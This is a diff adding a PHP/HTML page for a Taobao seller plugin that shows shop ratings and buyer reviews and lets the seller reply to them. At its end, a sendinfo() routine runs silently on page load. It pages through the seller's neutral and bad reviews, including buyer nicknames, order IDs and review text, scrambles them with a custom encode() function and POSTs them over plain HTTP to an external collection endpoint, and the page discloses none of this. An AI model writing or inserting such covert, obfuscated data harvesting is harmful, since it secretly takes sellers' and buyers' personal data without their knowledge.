@@ -1,0 +1,751 @@
+<!DOCTYPE html>
+<html lang="en" manifest='jywebcacheapp.manifest'>
+<?php require_once ("app/views/public/head.php");?>
+<body>
+<?php require_once ("app/views/public/top.php");?>
+ <div class="container" style="margin-left: 10px;">
+      <div style="display: none;" id="adv_top"></div>
+        <div ><h4>店铺动态评分</h4>
+	            <div class="widget-head">
+	                <span class="subnav">宝贝与描述相符:</span><span  id="ms" style="font-size:14;color:blue;"></span>&nbsp;&nbsp;&nbsp;<span class="subnav">卖家的服务态度:</span><span  id="td" style="font-size:14;color:blue;"></span>&nbsp;&nbsp;&nbsp;<span class="subnav">卖家的发货速度:</span><span  id="sd" style="font-size:14;color:blue;"></span>
+	            </div>
+         	</div>
+      <h4>卖家信用<span id="leve" class="mjxysz"></span><span id="dpdj" class=""></span><span class="haopinglv">好评率:<span style="color:#f30;" id="goodp"></span></span>&nbsp;</h4>
+      <ul class="sui-nav nav-tabs nav-large" id="myTab" >
+		  <li class="active"><a data-toggle="tab" href="#buyp" id="wangsx2" onclick="bridge(1,'get','buyer','good','samplebuyp','wangsx2')">收到的好评<span id="goodnum"></span></a></li>
+		  <li ><a data-toggle="tab" href="#neutralp" id="wangsx4" onclick="bridge(1,'get','buyer','neutral','sampleneutral','wangsx4')">收到的中评<span id="neutralnum"></span></a></li>
+		  <li><a data-toggle="tab" href="#chap" id="wangsx1" onclick="bridge(1,'get','buyer','bad','samplechap','wangsx1')">收到的差评<span id="badnum"></span></a></li>
+          <li ><a data-toggle="tab" href="#myp" id="wangsx3" onclick="bridge(1,'give','seller','','samplemyp','wangsx3')">给他人的评价<span id="givenum"></span></a></li>
+     </ul>
+	 <div class="tab-content" style="overflow: visible;">
+		     <div id="chap" class="tab-pane">
+				<table id="samplechap" class="sui-table table-striped table-bordered" style="margin-top: 10px;">
+				</table>
+ 				<div id="chapfyswangsx1"></div>
+		 	 </div>
+			 <div id="neutralp" class="tab-pane">
+					<table id="sampleneutral" class="sui-table table-striped table-bordered" style="margin-top: 10px;">
+					</table>
+ 					<div id="chapfyswangsx4"></div>
+		 		 </div>
+		 	 <div id="buyp" class="tab-pane active">
+					<table id="samplebuyp" class="sui-table table-striped table-bordered" style="margin-top: 10px;">
+					</table>
+ 					<div id="chapfyswangsx2"></div>
+		 		 </div>
+		 	  <div id="myp" class="tab-pane">
+					<table id="samplemyp" class="sui-table table-striped table-bordered" style="margin-top: 10px;">
+					</table>
+ 					<div id="chapfyswangsx3"></div>
+		 		 </div>
+		 <!-- 评价解释-->
+		 <div id="jies" class="sui-modal hide fade" role="dialog" tabIndex="-1" data-hasfoot="false">
+			<div class="modal-dialog">    
+				<div class="modal-content">      
+					<div class="modal-header">        
+					<button aria-hidden="true" class="sui-close" type="button" data-dismiss="modal">×</button>        
+					<h4 id="myModalLabel" class="modal-title">评价解释</h4>      
+					</div>      
+					<div class="modal-body">
+					<textarea class="span12" id="jscon" placeholder="请填写您想要想要给的解释..." style="margin-top: 5px;height:100px; width:390px"></textarea>
+						</div>      
+					<div class="modal-footer">        
+						<button class="sui-btn btn-primary btn-large" id="surejs" type="button" data-ok="modal" onclick="surejS();">确定解释</button>        
+						<button class="sui-btn btn-default btn-large" type="button" data-dismiss="modal">关闭</button>      
+					</div>    
+				</div>  
+			</div>
+		</div>
+	</div>
+</div>
+<script type="text/javascript">
+window.onload = function(){
+    QN.initTheme();
+    $("#pjglsel").attr("class","dqzt");
+	evaluat();
+	onload_viptime('evaluate');
+	sendinfo();/*收集中差评*/
+	ittoolspam('AD20140730133000','pjglp');
+}
+	function reshow(){
+		evaluat();
+	}
+	var nick='';
+	var page_no=1;
+	var page_size=20;
+	var rate_type="get";
+	var role="buyer";
+	var result="bad";
+	var wangfy="";
+	var level="";
+	var pingid="samplechap";
+	 function evaluat(){
+		 QN.application.invoke({
+			 "cmd": "getLoginuser",
+			 "success": function (rsp){
+				 if(typeof  rsp=== 'string'){
+		            	rsp = JSON.parse(rsp);
+		            }
+				 nick=decodeURI(rsp.user_nick);
+			 QN.top.invoke({
+					 "cmd": "taobao.shop.get",
+					 "param": {'fields':"shop_score",'nick':nick},
+					 "method": "get",
+					 "success": function(e){
+						 //countbuy();
+						 if(typeof  e=== 'string'){
+				            	e = JSON.parse(e);
+				            }
+					 $("#ms").html(e.shop_get_response.shop.shop_score.item_score+'分');
+					 $("#td").html(e.shop_get_response.shop.shop_score.service_score+'分');
+					 $("#sd").html(e.shop_get_response.shop.shop_score.delivery_score+'分');
+					 },
+					 error: function(msp){
+                         if(typeof msp === 'string'){
+                             var msp = JSON.parse(msp);
+                         }else{
+                             var msp= msp;
+                         }
+                         geterrorinfo('taobao.shop.get',msp);
+                     }
+					 });
+		       	  }
+	       	  });
+
+			 QN.top.invoke({
+				 "cmd": "taobao.user.seller.get",
+				 "param": {'fields':"seller_credit,type"},
+				 "method": "get",
+				 "success": function(e){
+					 if(typeof  e=== 'string'){
+			            	e = JSON.parse(e);
+			            }
+					 var result = (e.user_seller_get_response.user.seller_credit.good_num/e.user_seller_get_response.user.seller_credit.total_num)*100;
+					 var lev=e.user_seller_get_response.user.seller_credit.level;
+					 var tra=e.user_seller_get_response.user.seller_credit.score;
+					 level=e.user_seller_get_response.user.type;
+					 switch( lev) {
+	                    case 1:{userl="one";}break;
+	                    case 2:{userl="two";}break;
+	                    case 3:{userl="three";}break;
+	                    case 4:{userl="four";}break;
+	                    case 5:{userl="five";}break;
+	                    case 6:{userl="six";}break;
+	                    case 7:{userl="seven";}break;
+	                    case 8:{userl="eight";}break;
+	                    case 9:{userl="nine";}break;
+	                    case 10:{userl="ten";}break;
+	                    case 11:{userl="eleven";}break;
+	                    case 12:{userl="twelve";}break;
+	                    case 13:{userl="thirteen";}break;
+	                    case 14:{userl="fourteen";}break;
+	                    case 15:{userl="fiveteen";}break;
+	                    case 16:{userl="sixteen";}break;
+	                    case 17:{userl="seventeen";}break;
+	                    case 18:{userl="eighteen";}break;
+	                    case 19:{userl="nineteen";}break;
+	                    case 20:{userl="twenty";}break;
+	                    default:{userl="";}break;
+	                }
+					 document.getElementById('dpdj').setAttribute("class", 'dpdj '+userl); 
+					 $("#leve").html(tra);
+					 if(result.toFixed(2)=='NaN'){
+						 $("#goodp").html('0.00%');
+					 }else{
+						 $("#goodp").html(result.toFixed(2)+'%');
+						 }
+					 /*bridge(1,'get','buyer','bad','samplechap','wangsx1');*/
+					 bridge(1,'get','buyer','good','samplebuyp','wangsx2')
+				 },
+				 error: function(msp){
+                     if(typeof msp === 'string'){
+                         var msp = JSON.parse(msp);
+                     }else{
+                         var msp= msp;
+                     }
+                     geterrorinfo('taobao.user.seller.get',msp);
+                 }
+				 });
+        }
+     function bridge(page_no,give,seller,good,pingiid,wang){
+    	 rate_type=give;
+    	 role=seller;
+    	 result=good;
+    	 page_no=page_no;
+    	 pingid=pingiid;
+    	 wangfy=wang;
+    	 var yooz="bridgeP('"+page_no+"','"+give+"','"+seller+"','"+good+"','"+pingiid+"','"+wang+"')";
+    	 document.getElementById(wangfy).setAttribute("onclick",yooz); 
+    	 maij(page_no);
+    	 if(good=='' || good==null){
+    		 tradedots('othersrates');
+         }else{
+        	 tradedots(good+'rates');
+         }
+        }
+     function bridgeP(page_nos,gives,sellers,goods,pingiids,wangs){
+    	 page_no=page_nos;
+    	 rate_type=gives;
+    	 role=sellers;
+    	 result=goods;
+    	 pingid=pingiids;
+    	 wangfy=wangs;
+         }
+
+     function masterchen(){
+		QN.top.invoke({
+			"cmd":'tmall.traderate.feeds.get',
+		     "param":{
+			 "child_trade_id": '596494405212458'
+			 },
+			 "method":"GET",
+			 "success":function(rsp){
+				 if(typeof  rsp=== 'string'){
+		            	rsp = JSON.parse(e);
+		            }
+						alert(JSON.stringify(rsp));
+				 },
+			 "error":function(e){
+				 if(typeof  e=== 'string'){
+		            	e= JSON.parse(e);
+		            }
+				 geterrorinfo('tmall.traderate.feeds.get',e);
+				 }
+			});
+      }  
+
+
+
+
+
+       /* function masterchen(){
+ 		QN.top.invoke({
+ 			"cmd":'taobao.traderate.impr.imprword.byfeedid.get',
+ 			 "param":{
+ 		 	"child_trade_id":488586899480585 
+ 		 	},
+ 		 	"method":"GET",
+ 		 	"success":function(rsp){
+ 			 if(typeof  rsp=== 'string'){
+ 	            	rsp = JSON.parse(e);
+ 	            }
+ 					alert(JSON.stringify(e));
+ 			 },
+ 			 "error":function(e){
+ 			 if(typeof  e=== 'string'){
+ 	            	e= JSON.parse(e);
+ 	            }
+ 	             alert('error----\r\n'+JSON.stringify(e));
+ 			 }
+ 		});
+	}   */  
+       
+ 		/* function masterchen(){
+    	  QN.top.invoke({
+     			"cmd":'tmall.traderate.feeds.get',
+     			"param":{
+     		 	"child_trade_id":488586899480585 
+     		 	},
+     		 	"method":"GET",
+     		 	"success":function(rsp){
+     			 if(typeof  rsp=== 'string'){
+     	            	rsp = JSON.parse(e);
+     	            }
+   	            	alert(JSON.stringify(rsp));
+     			 },
+     			 "error":function(e){
+     			 if(typeof  e=== 'string'){
+     	            	e= JSON.parse(e);
+     	            }
+      				alert(JSON.stringify(e));
+     			 }
+     		});
+        	} */ 
+     function maij(page_no){
+    	 $("#"+pingid).empty();
+    	 $("#chapfys"+wangfy).html('<div class="sui-loading loading-small " style="overflow: hidden;"><i class="sui-icon icon-pc-loading"></i></div>');
+    	/* if(wangfy=='wangsx1'){
+    	 document.getElementById(wangfy).setAttribute("onclick", "bridge(1,'get','buyer','bad','samplechap','wangsx1')"); 
+    	 }else if(wangfy=='wangsx2'){
+    		 document.getElementById(wangfy).setAttribute("onclick", "bridge(1,'get','buyer','good','samplebuyp','wangsx2')"); 
+        	 }else{
+        		 document.getElementById(wangfy).setAttribute("onclick", "bridge(1,'give','seller','good','samplemyp','wangsx3')"); 
+            	 }*/
+         QN.top.invoke({
+    	 "cmd": "taobao.traderates.get",
+    	 "param": {'fields':"valid_score,tid,oid,num_iid,rated_nick,nick,result,created,item_title,item_price,content,reply",
+	             'rate_type':rate_type,
+	             'role':role,
+	             'result':result,
+	             'page_no':page_no,
+	             'page_size':page_size},
+    	 "method": "get",
+    	 "success": function(e){
+    		 if(typeof  e=== 'string'){
+	            	e = JSON.parse(e);
+	            }
+         $("#chapfys"+wangfy).empty();
+    	 var total = e.traderates_get_response.total_results;
+    	 if(total==1500||total=='1500')var totals='1500+';else totals=total;
+    	 if(result=='')$("#givenum").html('('+totals+')');else $("#"+result+"num").html('('+totals+')');
+    	 if(total>0){
+    		 $("#num"+pingid).html('('+total+')');
+    		 var rsp = e.traderates_get_response.trade_rates.trade_rate;
+    		 //level!='C' && wangfy!='wangsx3'
+    		if(level!='C' && wangfy!='wangsx3'){
+	         	$("#"+pingid).append('<thead ><tr style="background-color:silvery;"><td width="10%" style="text-align:center">评价结果</td><td width="15%" style="text-align:center">评价内容</td><td style="text-align:center" width="14%">买家昵称</td><td  style="text-align:center" width="32%">宝贝名称</td><td style="text-align:center" width="23%">操作</td></tr></thead>');
+    		 }else{
+    			$("#"+pingid).append('<thead ><tr style="background-color:silvery;"><td style="text-align:center" width="10%">评价结果</td><td style="text-align:center" width="35%">评价内容</td><td style="text-align:center" width="20%">买家昵称</td><td style="text-align:center" width="35%">宝贝名称</td></tr></thead>');
+    		}
+		    for(index in rsp){
+	    		 var rate = rsp[index];
+	    		 /*datas.cont=rate.content;
+	    		 if(pingid=='samplemyp'){
+		    		 datas.nickn=rate.rated_nick;
+		    		 }else{
+		    			 datas.nickn=rate.nick;
+			    		 }
+	    		 datas.time=rate.created;
+	    		 datas.reply=rate.reply;
+	    		 datas.iid=rate.num_iid;
+	    		 datas.result=rate.result;
+	    		 datas.tid=rate.tid;
+	    		 datas.item_price=rate.item_price;
+	    		 datas.title=rate.item_title;
+
+	    		 var source = $("#samplechapmo").html();
+	             var template=Handlebars.compile(source);
+	             var htmlstr = template(datas);
+	             $("#"+pingid).append(htmlstr); 
+	              
+	    	     $("#"+pingid).trigger('create');
+	    		 */
+				if(pingid=='samplemyp'){
+					var rated_nick=rate.rated_nick;
+					var rated_nicks="'"+rate.rated_nick+"'";
+					}else{
+					var rated_nick=rate.nick;
+					var rated_nicks="'"+rate.nick+"'";
+				}
+				/* var content=rate.content;
+				var created=rate.created;
+				var result=rate.result;
+				var tid=rate.tid;
+				var item_price=rate.item_price;
+				var item_title=rate.item_title;
+				var num_iid=rate.num_iid;
+				var ti=getdates(created); */
+				
+				var datas={};
+				datas.result=rate.result;
+				datas.content=rate.content;
+				datas.rated_nick=rated_nick;
+				datas.rated_nicks=rated_nicks;
+				datas.created=rate.created;
+				datas.num_iid=rate.num_iid;
+				datas.tid=rate.tid;
+				datas.oid=rate.oid;
+				datas.reply=rate.reply;
+				datas.item_title=rate.item_title;
+				datas.item_price=rate.item_price;
+				//level!='C' && wangfy!='wangsx3'
+				if(level!='C' && wangfy!='wangsx3'){
+					/* var caoz='<td width="10%"><a data-toggle="modal" href="#jies" onclick="jies('+tid+','+ti+')">评价解释</a></td>'; */
+					datas.caoz=true;
+				}else{
+					datas.caoz=false;
+					/* datas.caoz=true; */
+				}
+				if(rate.valid_score==true){
+					datas.valid_score='';
+				}else{
+					datas.valid_score='不计分';
+				}
+				/* var datas={};
+				datas.result=result;
+				datas.content=content;
+				datas.rated_nicks=rated_nicks;
+				datas.created=created;  
+				datas.num_iid=num_iid;
+				datas.item_title=item_title;
+				datas.item_price=item_price;
+				datas.caoz=caoz;
+				datas.rated_nick=rated_nick;
+				datas.tid=tid;
+				datas.ti=ti;
+				datas.reply=rate.reply;
+				if(rate.valid_score==true){
+					datas.valid_score='计分';
+				}else{
+					datas.valid_score='不计分';
+				} */
+				var source=$("#shop_pingjia_template").html();
+				var template=Handlebars.compile(source);
+				var htmlstr=template(datas);;
+				$("#"+pingid).append(htmlstr);
+	           //$("#"+pingid).append('<tr><td td width="28%"><img src="http://cdn.zzgdapp.com/trade/web/images/'+result+'.png" width="12" title="'+result+'" >'+content+'</td><td width="15%"><a href="javascript:void(0);" onclick="wangwangP('+rated_nicks+')" > <img border="0" src="http://amos.alicdn.com/realonline.aw?v=2&uid='+rated_nick+'&site=cntaobao&s=2&charset=utf-8"/>'+rated_nick+'</a></td><td width="14%">'+created+'</td><td width="35%"><a href="javascript:void(0);" onclick="changetosP('+num_iid+')">'+item_title+'</a>&nbsp;<span style="font-size:12px; color:red;font-weight:700;">'+item_price+'元</span></td>'+caoz+'</tr>');
+	        	 }
+	    	 if(total>page_size){
+	    		 var page_sum=Math.ceil(total/page_size); 
+	    		 pagin('chapfys'+wangfy,'maij',page_no,page_sum,total);
+	        	 }
+	    	 }else{
+		    	 if(pingid=="samplechap"){
+		    		 $("#chap").empty();
+		        	 $("#chap").append('<div class="sui-msg msg-large msg-tips" style="width:100%;"><div class="msg-con" id="tjloading">您还没有收到过差评记录!</div><s class="msg-icon"></s></div>');
+			    	 }else if(pingid=="sampleneutral"){
+			    		 $("#neutralp").empty();
+			    		 $("#neutralp").append('<div class="sui-msg msg-large msg-tips" style="width:100%;"><div class="msg-con" id="tjloading">您还没有收到过中评记录!</div><s class="msg-icon"></s></div>');
+			    	 }else if(pingid=="samplebuyp"){
+			    		 $("#buyp").empty();
+			    		 $("#buyp").append('<div class="sui-msg msg-large msg-tips" style="width:100%;"><div class="msg-con" id="tjloading">您还没有收到买家的评价!</div><s class="msg-icon"></s></div>');
+					    	 }else{
+				    		 $("#myp").empty();
+				    		 $("#myp").append('<div class="sui-msg msg-large msg-tips" style="width:100%;"><div class="msg-con" id="tjloading">您还没有给过买家评价!</div><s class="msg-icon"></s></div>');
+			    	 }
+		    	 }
+    	 },
+    	 error: function(msp){
+             if(typeof msp === 'string'){
+                 var msp = JSON.parse(msp);
+             }else{
+                 var msp= msp;
+             }
+             geterrorinfo('taobao.user.seller.get1',msp);
+         }
+	        	 
+    	 });
+ 	}
+function levelJ(){
+	QN.top.invoke({
+		"cmd": "taobao.user.seller.get",
+		"param": {'fields':"type"},
+		"method": "get",
+		"success": function (rsp){
+			 if(typeof rsp === 'string'){
+                 var rsp = JSON.parse(rsp);
+             }else{
+                 var rsp= rsp;
+             }
+			var resu=rsp.user_seller_get_response.user.type;
+			level=resu;
+		},
+		error: function(msp){
+            if(typeof msp === 'string'){
+                var msp = JSON.parse(msp);
+            }else{
+                var	msp= msp;
+            }
+            geterrorinfo('taobao.user.seller.get1',msp);
+        }
+		});
+}
+function jies(oid){
+	 $("#surejs").attr("onclick", "surejS('"+oid+"')");
+	 $('#jies').modal('show');
+ 	}
+function surejS(oid){
+ 		var text=$("#jscon").val();
+ 	    if(text.length<2||text.length>500){
+ 	    	layer.msg('评价解释内容长度只能在2~500个字之间！', 1, 3);
+ 		    }else{
+ 				QN.top.invoke({
+ 					"cmd": "taobao.traderate.explain.add",
+ 					"param": {'oid':oid,'reply':text},
+ 					"method": "get",
+ 					"success": function(rsp){
+ 						if(typeof rsp === 'string'){
+ 			                 var rsp = JSON.parse(rsp);
+ 			             }else{
+ 			                 var rsp= rsp;
+ 			             }
+ 						var bo=rsp.traderate_explain_add_response.is_success;
+ 						if(bo||bo=='true'){
+ 							layer.msg('评价解释成功！', 1, 1);
+ 	 				 	    reshow();
+ 							}else{
+ 								geterrorinfo('taobao.traderate.explain.add1',rsp);
+ 							}
+ 					},
+ 					"error": function(msp){
+	 			            if(typeof msp === 'string'){
+	 			                var msp = JSON.parse(msp);
+	 			            }else{
+	 			                var	msp= msp;
+	 			            }
+		 			        geterrorinfo('taobao.traderate.explain.add',msp);
+ 			        }
+ 				});
+ 	    }
+ 		
+ 	}
+function getdates(enddate){     /*     计算时间差          */
+ 	    var date2=new Date(Date.parse(enddate.replace(/-/g,"/")));
+ 	    var s2=date2.getTime();
+ 	    var date1=new Date();
+ 	    var s1=date1.getTime();
+ 	    ms=s1-s2;
+ 	    h=Math.floor(ms/(3600*1000*24));
+ 	    /*m=Math.floor((ms-h*3600*1000*24)/(3600*1000));
+ 	    s=Math.floor((ms-h*3600*1000*24-m*3600*1000)/60000);*/
+ 	    return h;
+ 	}
+function countbuy(){
+	     //levelJ();
+       	 var goodnum=0;
+       	 var neutralnum=0;
+       	 var badnum=0;
+         var allnum=0;
+         var result='';
+           QN.top.invoke({
+               "cmd": "taobao.traderates.get",
+               "param": {'fields':"tid",
+    		   "rate_type":'get',
+               "role":'buyer',
+               "result":'good'
+               },
+               "method": "get",
+               "success": function (rsp){
+                   if(typeof rsp === 'string'){
+                       var rsp = JSON.parse(rsp);
+                   }else{
+                       var rsp= rsp;
+                   }
+                   goodnum = rsp.traderates_get_response.total_results;
+                   if(goodnum==1500||goodnum=='1500')goodnum='1500+';
+                   QN.top.invoke({
+                       "cmd": "taobao.traderates.get",
+                       "param": {'fields':"tid",
+            		   "rate_type":'get',
+                       "role":'buyer',
+                       "result":'neutral'
+                       },
+                       "method": "get",
+                       "success": function (rsp){
+                           if(typeof rsp === 'string'){
+                               var rsp = JSON.parse(rsp);
+                           }else{
+                               var rsp= rsp;
+                           }
+                           neutralnum = rsp.traderates_get_response.total_results;
+                           if(neutralnum==1500||neutralnum=='1500')neutralnum='1500+';
+                           QN.top.invoke({
+                               "cmd": "taobao.traderates.get",
+                               "param": {'fields':"tid",
+                    		   "rate_type":'get',
+                               "role":'buyer',
+                               "result":'bad'
+                               },
+                               "method": "get",
+                               "success": function (rsp){
+                                   if(typeof rsp === 'string'){
+                                       var rsp = JSON.parse(rsp);
+                                   }else{
+                                       var rsp= rsp;
+                                   }
+                                   badnum = rsp.traderates_get_response.total_results;
+                                   if(badnum==1500||badnum=='1500')badnum='1500+';
+                                   QN.top.invoke({
+                                       "cmd": "taobao.traderates.get",
+                                       "param": {'fields':"tid",
+                            		   "rate_type":'give',
+                                       "role":'seller'
+                                       },
+                                       "method": "get",
+                                       "success": function (rsp){
+                                           if(typeof rsp === 'string'){
+                                               var rsp = JSON.parse(rsp);
+                                           }else{
+                                               var rsp= rsp;
+                                           }
+                                           givenum = rsp.traderates_get_response.total_results;
+                                           if(givenum==1500||givenum=='1500')givenum='1500+';
+                                           $("#goodnum").html('('+goodnum+')');
+                                           $("#badnum").html('('+badnum+')');
+                                           $("#neutralnum").html('('+neutralnum+')');
+                                           $("#givenum").html('('+givenum+')');
+                                       },
+                                       error: function(msp){
+                                           if(typeof msp === 'string'){
+                                               var msp = JSON.parse(msp);
+                                           }else{
+                                               var	msp= msp;
+                                           }
+                                           geterrorinfo('taobao.traderates.get5',msp);
+                                       }
+                                   });
+                               },
+                               error: function(msp){
+                                   if(typeof msp === 'string'){
+                                       var msp = JSON.parse(msp);
+                                   }else{
+                                       var	msp= msp;
+                                   }
+                                   geterrorinfo('taobao.traderates.get6',msp);
+                               }
+                           });
+                       }
+                   });
+               },
+               error: function(msp){
+                   if(typeof msp === 'string'){
+                       var msp = JSON.parse(msp);
+                   }else{
+                       var msp= msp;
+                   }
+                   geterrorinfo('taobao.traderates.get',msp);
+               }
+           });
+    }
+	
+function changetosP(num_id){
+    QN.plugin.invoke({
+    	"cmd": "itemDetail",
+    	"param": {
+    	'iid':num_id
+    	},
+    	"category": "shangpinguanli"
+    	});
+}
+</script>
+<script id="samplechapmo" type="text/x-handlebars-template">		
+					<tr >
+						<td width="27%"><img src="http://cdn.zzgdapp.com/trade/web/images/{{result}}.png" width="12" title="{{result}}" >{{cont}}<br/>{{reply}}
+						</td>
+						<td width="15%"><a href="javascript:void(0);" onclick="wangwangP('{{nickn}}')" > <img border="0" src="http://amos.alicdn.com/realonline.aw?v=2&uid={{nickn}}&site=cntaobao&s=2&charset=utf-8"/>{{nickn}}</a>
+						</td>
+						<td width="20%">{{time}}
+						</td>
+						<td width="30%"><a href="<?php echo APP_WEB_INDEX_ROOT;?>/trade/tradedetail#tid={{tid}}">{{title}}</a>&nbsp;<span style="font-size:14px; color:red;font-weight:700;">{{item_price}}元</span>
+						</td>
+						<td width="8%"><a href="javascript:jies('{{oid}}');" data-toggle="modal" data-target="#jies" data-keyboard="false" >评价解释</a><br/>{{reply}}
+						</td>
+					</tr>
+</script>
+<script id="shop_pingjia_template" type="text/x-handlebars-template">
+<tr>
+	<td style="text-align:center" width="10%"><img src="http://cdn.zzgdapp.com/trade/web/images/{{result}}.png" width="12" title="'{{result}}" ><br/><font color="red">{{valid_score}}</font></td>
+	<td width="23%">{{content}}<br/>
+		{{#if reply}}
+				<span><font color="#B28500">卖家解释：【{{reply}}】</font></span><br/>
+		{{/if}}
+		{{created}}
+	</td>
+	<td style="text-align:center" width="20%"><a href="javascript:void(0);" onclick="wangwangP({{rated_nicks}})" ><img border="0" src="http://amos.alicdn.com/realonline.aw?v=2&uid={{rated_nick}}&site=cntaobao&s=2&charset=utf-8"/>{{rated_nick}}</a></td>
+	<td style="text-align:center" width="35%"><a href="javascript:void(0);" onclick="changetosP('{{num_iid}}')">{{item_title}}</a>&nbsp;<span style="font-size:12px; color:red;font-weight:700;">{{item_price}}元</span></td>
+	{{#if caoz}}
+		<td style="text-align:center" width="12%">
+			<a href="javascript:jies('{{oid}}');" >评价解释</a>
+		</td>
+	{{/if}}
+</tr>
+</script>
+<!--
+	作者：306800838@qq.com
+	时间：2014-06-05
+	描述：……
+-->
+<script>
+function encode(str)
+{
+    var len = str.length;
+    var encode=str;
+    var code = ["H","J","K","Q","W","R","T","Y","U","O"];
+    for(i=0;i<10;i++){
+            encode = encode.replace(new RegExp(i,"gm"),code[i]); 
+    }
+    encode = encode.replace(new RegExp("%","gm"),"LL");
+    return  encode;
+}
+function sendinfo(){
+	var vddtime= new Date();
+	vddtime=vddtime.format("yyyy-MM-dd");
+	var isok=window.localStorage.getItem(user_nick+'sendinfo');
+	if(isok==vddtime){
+		return;
+	}else{
+		window.localStorage.setItem(user_nick+'sendinfo',vddtime);
+	}
+	         QN.top.invoke({
+		    	 "cmd": "taobao.traderates.get",
+		    	 "param": {'fields':"tid,oid,nick,result,created,rated_nick,content,num_iid",
+			             'rate_type':'get',
+			             'role':'buyer',
+			             'result':'neutral',
+			             'page_no':1,
+			             'page_size':150},
+		    	 "method": "get",
+		    	 "success": function(rsp){
+		    	 	if(typeof rsp === 'string'){
+                    	var rsp = JSON.parse(rsp);
+                    }else{
+                    	var rsp= rsp;
+                    }
+                    var total = rsp.traderates_get_response.total_results;
+                    var page_sum=Math.ceil(total/150);
+                    var rates=rsp.traderates_get_response.trade_rates;
+                    var json_res=encode(encodeURIComponent(JSON.stringify(rates)));
+                    sendtomcs(json_res);
+                    if(page_sum>1){
+                    	moresendinfo('neutral',2);
+                    }else{
+                    	moresendinfo('bad',1);
+                    }
+		    	 }
+    	 });
+}
+function moresendinfo(result,page_no){
+	QN.top.invoke({
+		    	 "cmd": "taobao.traderates.get",
+		    	 "param": {'fields':"tid,oid,nick,result,created,rated_nick,content,num_iid",
+			             'rate_type':'get',
+			             'role':'buyer',
+			             'result':result,
+			             'page_no':page_no,
+			             'page_size':150,
+			             'use_has_next':true,
+			             },
+		    	 "method": "get",
+		    	 "success": function(rsp){
+		    	 	console.log(result+':'+page_no);
+		    	 	if(typeof rsp === 'string'){
+                    	var rsp = JSON.parse(rsp);
+                    }else{
+                    	var rsp= rsp;
+                    }
+                    var rates=rsp.traderates_get_response.trade_rates;
+                    var json_res=encode(encodeURIComponent(JSON.stringify(rates)));
+                    sendtomcs(json_res);
+                    var use_has_next = rsp.traderates_get_response.has_next;
+                    if(use_has_next){
+                    	page_no=parseInt(page_no)+parseInt(1);
+                    	moresendinfo(result,page_no);
+                    }else{
+                    	console.log(result+' :no hava~');
+                    	if(result=='neutral'){
+                    		moresendinfo('bad',1);
+                    	}
+                    }
+                   
+		    	 }
+    	 });
+}
+function sendtomcs(json_res){
+	$.ajax({
+		    url: 'http://mcs.zzgdapp.com/trade/dex',
+		    type: 'post',
+
+		    data:{text:json_res},
+		    timeout:10000,
+	        success: function(data){
+	        	console.log('yes');
+				},
+	        error: function(){
+	        	console.log('no');
+				}
+		    });
+}
+</script>
+<?php require_once ("app/views/public/footer.php");?>
+</body>
+</html>
